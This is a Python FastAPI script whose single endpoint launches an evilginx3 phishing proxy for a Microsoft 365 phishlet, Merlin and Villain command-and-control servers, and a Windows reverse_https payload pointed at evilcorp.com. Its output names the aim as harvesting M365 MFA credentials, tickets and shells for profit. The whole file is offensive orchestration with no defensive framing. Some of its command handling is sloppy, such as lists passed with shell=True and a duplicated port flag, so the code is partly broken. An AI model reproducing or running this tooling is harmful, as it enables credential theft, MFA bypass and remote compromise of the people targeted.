from fastapi import FastAPI
from fastapi.staticfiles import StaticFiles
from fastapi.responses import JSONResponse
import subprocess
import json

app = FastAPI()
app.mount("/static", StaticFiles(directory="static"), name="static")

@app.get("/generate_all")
async def generate_all():
    log = "Deathstalker 2025 global death exploits launching max:\n\n"
    config = {"lhost": "evilcorp.com", "phish_domain": "office365.evilcorp.com", "c2_port": 443, "scan_ip": "10.10.10.0/24"}
    try:
        with open("config.json") as f: config.update(json.load(f))
    except: pass

    def run(cmd):
        nonlocal log
        try:
            res = subprocess.run(cmd, capture_output=True, text=True, timeout=180, shell=True)
            log += f"SUCCESS {' '.join(cmd)}\nOUT: {res.stdout}\nERR: {res.stderr}\n\n"
        except FileNotFoundError:
            log += f"TOOL MISSING INSTALL: {cmd[0]}\n\n"
        except Exception as e:
            log += f"FAIL {str(e)}\n\n"

    def bg(cmd):
        nonlocal log
        try:
            subprocess.Popen(cmd, shell=True)
            log += f"BACKGROUND LIVE: {' '.join(cmd)}\n\n"
        except: log += "BACKGROUND FAIL\n\n"

    bg(["evilginx3", "-p", "phishlets/microsoft365.yaml", "-l", "0.0.0.0", "-p", "443", "-c", "certs/evilginx.crt", "-k", "certs/evilginx.key"])
    run(["evilginx3", "phishlets", "hostname", "microsoft365", config["phish_domain"]])
    bg(["merlin", "server", "--ssl", "--port", "443"])
    run(["merlin", "agent", "generate", "-os", "windows", "-arch", "amd64", "-transport", "https"])
    bg(["villain", "server", "start", "http", "192.168.45.10:8080"])
    run(["villain", "generate", "windows", "reverse_https", f"LHOST={config['lhost']}", f"LPORT=443"])

    ops = [{"deathstalker_2025_global_domination": "full_m365_mfa_creds_tickets_shells_scans_live_max_profit"}]
    with open("opportunities.json", "w") as f: json.dump(ops, f, indent=2)

    return {"opportunities": ops, "log": log}

if __name__ == "__main__":
    import uvicorn
    uvicorn.run(app, host="0.0.0.0", port=8000)
